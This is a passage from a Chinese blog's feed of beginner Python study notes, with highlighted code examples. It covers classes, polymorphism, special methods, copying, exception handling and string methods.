title="object类"></a>object类</h3><ul><li>是所有类的父类</li><li>内置函数dir()可查看指定对象所有属性</li><li><code>__str__()</code>方法：返回一个对于对象的描述，对应于内置函数str()经常用于print()方法，查看对象信息</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">'我名字是{0},今年{1}岁'</span>.<span class="hljs-built_in">format</span>(self.name,self.age)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(stu))<br><span class="hljs-built_in">print</span>(stu)<span class="hljs-comment">#我名字是Jack,今年20岁</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(stu))<span class="hljs-comment">#&lt;class '__main__.Student'&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>1.不知变量引用类型，仍可以用此变量调用方法，在运行过程中根据变量所用对象类型，动态决定调用哪个对象中的方法。</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-type">def</span> <span class="hljs-title">eat</span>(self):<br>        print(<span class="hljs-string">'动物吃东西'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(Animal):<br>    def eat(self):<br>        print(<span class="hljs-string">'狗吃骨头'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(Animal):<br>    def eat(self):<br>        print(<span class="hljs-string">'猫吃鱼'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-type">def</span> <span class="hljs-title">eat</span>(self):<br>        print(<span class="hljs-string">'人吃饭'</span>)<br>def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(obj)</span></span>:<br>    obj.eat()<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Cat()</span></span>)#猫吃鱼<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Dog()</span></span>)#狗吃骨头<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Animal()</span></span>)#动物吃东西<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Person()</span></span>)#人吃饭<br></code></pre></td></tr></tbody></table></figure><p>2.静态语言与动态语言</p><p>（1）静态语言实现多态的三个必要条件：继承、方法重写、父类引用。指向子类对象。</p><p>（2）动态语言的多态崇尚“鸭子类型”，当看到一只鸟走起来像鸭子，游泳似鸭，收起来也似鸭，那么这只鸟可被称为鸭子。在鸭子类型中，无需关心对象是什么类型，到底是不是鸭子，只关心对象的行为。</p><h2 id="特殊方法和特殊属性"><a href="#特殊方法和特殊属性" class="headerlink" title="特殊方法和特殊属性"></a>特殊方法和特殊属性</h2><h3 id="特殊属性"><a href="#特殊属性" class="headerlink" title="特殊属性"></a>特殊属性</h3><p><code>__dict__</code>获得类对象或者实例对象所绑定的所有属性和方法的字典</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span>(dir(object))<br>class A:<br>    pass<br>class B:<br>    pass<br>class C(A,B):<br>    def __init__(self,name,age):<br>        self.<span class="hljs-attribute">name</span>=name<br>        self.<span class="hljs-attribute">age</span>=age<br><span class="hljs-attribute">x</span>=C('Jack',20)# x为C类的一个实例对象<br><span class="hljs-built_in">print</span>(x.__dict__)#实例对象的属性字典 {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Jack'</span>, <span class="hljs-string">'age'</span>: 20}<br><span class="hljs-built_in">print</span>(C.__dict__)#{<span class="hljs-string">'__module__'</span>: <span class="hljs-string">'__main__'</span>, <span class="hljs-string">'__init__'</span>: &lt;function C.__init__ at 0x000002B51547DC10&gt;, <span class="hljs-string">'__doc__'</span>: None}<br><span class="hljs-built_in">print</span>(x.__class__)#输出了对象所属的类 &lt;class <span class="hljs-string">'__main__.C'</span>&gt;<br><span class="hljs-built_in">print</span>(C.__bases__)#C类的父类类型元素 (&lt;class <span class="hljs-string">'__main__.A'</span>&gt;, &lt;class <span class="hljs-string">'__main__.B'</span>&gt;)<br><span class="hljs-built_in">print</span>(C.__base__)#类的基类 &lt;class <span class="hljs-string">'__main__.A'</span>&gt;<br><span class="hljs-built_in">print</span>(C.__mro__)#类的层次结构 (&lt;class <span class="hljs-string">'__main__.C'</span>&gt;, &lt;class <span class="hljs-string">'__main__.A'</span>&gt;, &lt;class <span class="hljs-string">'__main__.B'</span>&gt;, &lt;class <span class="hljs-string">'object'</span>&gt;)<br><span class="hljs-built_in">print</span>(A.__subclasses__())#子类的列表 [&lt;class <span class="hljs-string">'__main__.C'</span>&gt;]<br></code></pre></td></tr></tbody></table></figure><h3 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h3><ul><li><code>__len__()</code> 通过重写此方法，让len()的参数可以自定义类型</li><li><code>__add__()</code> 通过重写此方法，令自定义对象具有相加的功能</li><li><code>__new__()</code> 创建对象</li><li><code>__init__()</code> 对创建的对象初始化</li></ul><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name</span>):<br>        <span class="hljs-variable language_">self</span>.name=name<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,other</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.name+other.name<br>stu1=Student(<span class="hljs-string">'Jack'</span>)<br>stu2=Student(<span class="hljs-string">'Rose'</span>)<br>s=stu1+stu2<br>print(s)<span class="hljs-comment">#JackRose</span><br>print(stu1.__add__(stu2))<span class="hljs-comment">#JackRose</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__led__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.name)<br>···<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<span class="hljs-comment">#8</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls,*args,**kwargs</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'__new__被调用执行了，cls的id值为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(cls)))<br>        obj=<span class="hljs-built_in">super</span>().__new__(cls)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'创建对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(obj)))<br>        <span class="hljs-keyword">return</span> obj<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'object类对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">object</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'Person类对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(Person)))<br> <span class="hljs-comment">#创建Person类的实例对象</span><br>p1=Person(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'p1这个Person类的实例对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(p1)))<br> <span class="hljs-comment">#object类对象id为140723223092736</span><br> <span class="hljs-comment">#Person类对象id为2976723261008</span><br> <span class="hljs-comment">#__new__被调用执行了，cls的id值为2976723261008</span><br> <span class="hljs-comment">#创建对象id为2976753841488</span><br> <span class="hljs-comment">#p1这个Person类的实例对象id为2976753841488</span><br></code></pre></td></tr></tbody></table></figure><p>解读：</p><ol><li>执行<code>p1=Person()</code>，将值传入class Person中的cls</li><li><strong>new</strong>()创建对西昂obj,传值cls</li><li>obj返回，传入初始化__init__()</li><li>初始化后返回p1</li></ol><h2 id="类的浅拷贝与深拷贝"><a href="#类的浅拷贝与深拷贝" class="headerlink" title="类的浅拷贝与深拷贝"></a>类的浅拷贝与深拷贝</h2><ol><li>变量的赋值操作</li><li>浅拷贝：对象包含的子对象内容不拷贝，因此，源对象与拷贝对象会引用同一个对象</li><li>深拷贝：使用copy模块中的deepcopy函数，递归拷贝对象中包含的子对象，源对象和拷贝对象所有的子对象也不相同。</li></ol><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">class Cpu:<br>    pass<br>class Disk:<br>    pass<br>class Computer:<br>    def __init__(self,cpu,disk):<br>        self.<span class="hljs-attribute">cpu</span>=cpu<br>        self.<span class="hljs-attribute">disk</span>=disk<br> #变量的赋值<br><span class="hljs-attribute">cpu1</span>=Cpu()<br><span class="hljs-attribute">cpu2</span>=cpu1<br><span class="hljs-built_in">print</span>(cpu1,cpu2)<br> #类的浅拷贝<br><span class="hljs-attribute">disk</span>=Disk()<br><span class="hljs-attribute">computer</span>=Computer(cpu1,disk)<br>import copy<br><span class="hljs-attribute">computer2</span>=copy.copy(computer)<br><span class="hljs-built_in">print</span>(computer,computer.cpu,computer.disk)#&lt;__main__.Computer object at 0x000002B5136EFB20&gt;，&lt;__main__.Cpu object at 0x000002B51463B490&gt;，&lt;__main__.Disk object at 0x000002B51463B910&gt;<br><span class="hljs-built_in">print</span>(computer2,computer2.cpu,computer2.disk)#&lt;__main__.Computer object at 0x000002B5148602E0&gt;，&lt;__main__.Cpu object at 0x000002B514860460&gt;，&lt;__main__.Disk object at 0x000002B5148601C0&gt;<br> #只拷贝computer,不拷贝子对象(disk,cpu)<br> #深拷贝<br><span class="hljs-attribute">computer3</span>=copy.deepcopy(computer)<br><span class="hljs-built_in">print</span>(computer3,computer3.cpu,computer3.disk)#&lt;__main__.Computer object at 0x000002B51541C730&gt; &lt;__main__.Cpu object at 0x000002B51541CBE0&gt; &lt;__main__.Disk object at 0x000002B51541C160&gt;<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;面向对象篇啦！！！！&lt;/p&gt;
&lt;h1 id=&quot;类与对象&quot;&gt;&lt;a href=&quot;#类与对象&quot; class=&quot;headerlink&quot; title=&quot;类与对象&quot;&gt;&lt;/a&gt;类与对象&lt;/h1&gt;&lt;p&gt;类：多个类似事物组成的群体；数据类型&lt;/p&gt;
&lt;p&gt;对象：100，99是int类下包含的</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习7</title>
    <link href="https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A07/"/>
    <id>https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A07/</id>
    <published>2022-09-19T11:28:00.378Z</published>
    <updated>2022-09-19T15:05:38.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>1.常见类型</p><p>(1)语法错误：SyntaxError</p><p>(2)索引越界问题：IndexError</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lst=<span class="hljs-selector-attr">[1,2,3,4]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst[<span class="hljs-number">4</span>])</span></span><br>l=<span class="hljs-selector-attr">[]</span><br>l=<span class="hljs-built_in">append</span>(<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(l)</span></span><br> #修改：l<span class="hljs-selector-class">.append</span>(<span class="hljs-string">'a'</span>)<br></code></pre></td></tr></tbody></table></figure><p>(3)思路不清导致的问题解决方案</p><ul><li>使用print()</li><li>用<code> #</code>暂时注释代码<br>(4)被动：用户输入错误导致返回错误</li></ul><h1 id="Python异常处理机制"><a href="#Python异常处理机制" class="headerlink" title="Python异常处理机制"></a>Python异常处理机制</h1><p>Python提供了异常处理机制，可以在异常出现时即时捕获。内部消化，令程序继续运行。</p><h2 id="try-…-except-异常类型-……"><a href="#try-…-except-异常类型-……" class="headerlink" title="try:…     except 异常类型:……"></a><code>try:…     except 异常类型:……</code></h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    b=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    c=a/b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Sorry,Not is 0'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="多个except结构：try…except…excep…except-BaseException-…"><a href="#多个except结构：try…except…excep…except-BaseException-…" class="headerlink" title="多个except结构：try…except…excep…except BaseException:…"></a>多个except结构：<code>try…except…excep…except BaseException:…</code></h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    b=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    c=a/b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Sorry,Not is 0'</span>)<br><span class="hljs-keyword">except</span> ValueError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'input number'</span>)<br><span class="hljs-keyword">except</span> BaseException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></tbody></table></figure><h2 id="try…except…finally"><a href="#try…except…finally" class="headerlink" title="try…except…finally"></a><code>try…except…finally</code></h2><p>finally无论是否异常都执行，常用于释放try中申请的资源。</p><h2 id="常见异常类型"><a href="#常见异常类型" class="headerlink" title="常见异常类型"></a>常见异常类型</h2><ul><li>ZeroDivisionError ——除零（所有数据类型）</li><li>IndexError ——序列中没有此索引（index）</li><li>KeyError ——映射中没有此链</li><li>NameError ——未声明初始化对象</li><li>SyntaxError ——Python语法错误</li><li>ValueError ——传入无效的参数</li></ul><h2 id="traceback模块"><a href="#traceback模块" class="headerlink" title="traceback模块"></a>traceback模块</h2><p>打印异常信息</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">traceback</span><br><span class="hljs-variable"><span class="hljs-keyword">try</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">except</span></span>:<br>    <span class="hljs-variable">traceback.print_exc</span>()<br></code></pre></td></tr></tbody></table></figure><h1 id="PyCharm开发环境的调试"><a href="#PyCharm开发环境的调试" class="headerlink" title="PyCharm开发环境的调试"></a>PyCharm开发环境的调试</h1><p>1.断点：程序运行到此处暂时挂起，停止执行</p><p>2.调试视图：</p><p>（1）工具栏按钮：运行三角键右侧蜘蛛样式</p><p>（2）右键编辑区：debug’模块名’</p><p>（3）shift+F9</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Bug&quot;&gt;&lt;a href=&quot;#Bug&quot; class=&quot;headerlink&quot; title=&quot;Bug&quot;&gt;&lt;/a&gt;Bug&lt;/h1&gt;&lt;p&gt;1.常见类型&lt;/p&gt;
&lt;p&gt;(1)语法错误：SyntaxError&lt;/p&gt;
&lt;p&gt;(2)索引越界问题：IndexError&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习6</title>
    <link href="https://sinky.top/2022/09/16/python%E5%AD%A6%E4%B9%A06/"/>
    <id>https://sinky.top/2022/09/16/python%E5%AD%A6%E4%B9%A06/</id>
    <published>2022-09-16T12:35:21.580Z</published>
    <updated>2022-09-19T05:16:18.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>python基本数据类型，不可变字符序列</p><h2 id="驻留机制"><a href="#驻留机制" class="headerlink" title="驻留机制"></a>驻留机制</h2><p>仅保存一份相同且不可变字符串的方法。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-string">'python'</span><br>b=<span class="hljs-string">'python'</span><br>c=<span class="hljs-string">'python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a,id(a)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b,id(b)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c,id(c)</span></span>)<span class="hljs-selector-id">#python</span> <span class="hljs-number">2381469127728</span><br></code></pre></td></tr></tbody></table></figure><p>驻留机制的几种情况（交互模式）</p><ul><li>字符串的长度为0或1时</li><li>符合标识符的字符串</li><li>字符串只在编译时进行驻留，而非运行时</li><li>[-5,256] 之间的整数数字</li></ul><blockquote><p>sys中的intern方法强留2个字符串指向同一个对象；<br>pycharm对字符串进行了优化处理</p></blockquote><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><ul><li>index() 查找子串第一次出现的位置，若不存在返回ValueError</li><li>rindex() 查找子串最后一次出现的位置，若不存在返回ValueError</li><li>find() 查找子串第一次出现的位置，若不存在返回-1</li><li>rfind() 查找子串最后一次出现的位置，若不存在返回-1</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello,hello'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.index(<span class="hljs-string">'lo'</span>)</span></span>) #<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.rindex(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">9</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.find(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.rfind(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">9</span><br></code></pre></td></tr></tbody></table></figure><h3 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h3><ul><li>upper() 所有字母转大写</li><li>lower() 所有字母转小写</li><li>swapcase() 大写转小写，小写转大写</li><li>capitalize() 首字母大写，其余小写</li><li>title() 每个单词首字母大写，剩余字符转小写</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello,Python'</span><br>a=s<span class="hljs-selector-class">.upper</span>()#转后产生新的字符串<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a)</span></span><span class="hljs-selector-id">#HELLO</span>,PYTHON <br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a,id(a)</span></span>) #<span class="hljs-number">1810982406960</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s,id(s)</span></span>) <span class="hljs-selector-id">#hello</span>,Python <span class="hljs-number">1810982405680</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.lower()</span></span>)<span class="hljs-selector-id">#hello</span>,python 转后产生新的字符串<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'------'</span>)</span></span><br>b=s<span class="hljs-selector-class">.lower</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b,id(b)</span></span>) <span class="hljs-selector-id">#hello</span>,python <span class="hljs-number">1810996753072</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s,id(s)</span></span>) <span class="hljs-selector-id">#hello</span>,Python <span class="hljs-number">1810982398768</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b == s)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b is s)</span></span><span class="hljs-selector-id">#False</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'------'</span>)</span></span><br>s2=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.swapcase()</span></span>) <span class="hljs-selector-id">#HELLO</span>,pYTHON<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.title()</span></span>)<span class="hljs-selector-id">#Hello</span>,Python<br></code></pre></td></tr></tbody></table></figure><h3 id="内容对齐"><a href="#内容对齐" class="headerlink" title="内容对齐"></a>内容对齐</h3><ul><li>center() 居中对齐，center([宽度],[填充符])</li><li>ljust 左对齐</li><li>rjust 右对齐</li><li>zfill() 右对齐，左边以0填充，zfill([宽度])</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-built_in">print</span>(s.center(20,<span class="hljs-string">'*'</span>))#****hello,Python****<br><span class="hljs-built_in">print</span>(s.ljust(20,<span class="hljs-string">'*'</span>))#hello,Python********<br><span class="hljs-built_in">print</span>(s.ljust(10))#hello,Python 宽度小于字符串本身，则返回字符串本身<br><span class="hljs-built_in">print</span>(s.rjust(20,<span class="hljs-string">'*'</span>))#********hello,Python<br><span class="hljs-built_in">print</span>(s.rjust(20))#        hello,Python<br><span class="hljs-built_in">print</span>(s.zfill(20))#00000000hello,Python<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'-8910'</span>.zfill(8))#-0008910<br></code></pre></td></tr></tbody></table></figure><h3 id="劈分"><a href="#劈分" class="headerlink" title="劈分"></a>劈分</h3><ul><li>split() 从字符串左边开始劈分，默认以空格劈分，返回结果为列表；以参数sep指定分隔符；以参数maxsplit指定分隔最大次数</li><li>rsplit() 从右边开始劈分</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello world Python'</span><br>l=s<span class="hljs-selector-class">.split</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(l)</span></span>#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br>s1=<span class="hljs-string">'hello|world|Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.split(sep=<span class="hljs-string">'|'</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.split(sep=<span class="hljs-string">'|'</span>,maxsplit=<span class="hljs-number">1</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world|Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.split()</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.rsplit(sep=<span class="hljs-string">'|'</span>,maxsplit=<span class="hljs-number">1</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello|world'</span>, <span class="hljs-string">'Python'</span>]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="判断字符串操作"><a href="#判断字符串操作" class="headerlink" title="判断字符串操作"></a>判断字符串操作</h3><ul><li>isidentifier() 是否合法标识符（字母数字下划线）</li><li>isspace() 是否全是空格</li><li>isalpha() 是否全是字母</li><li>isdecimal() 是否全是十进制数字</li><li>isnumeric() 是否全是数字</li><li>isalnum() 是否全是数字和字母组成</li></ul><h3 id="替换合并"><a href="#替换合并" class="headerlink" title="替换合并"></a>替换合并</h3><ul><li>replace() 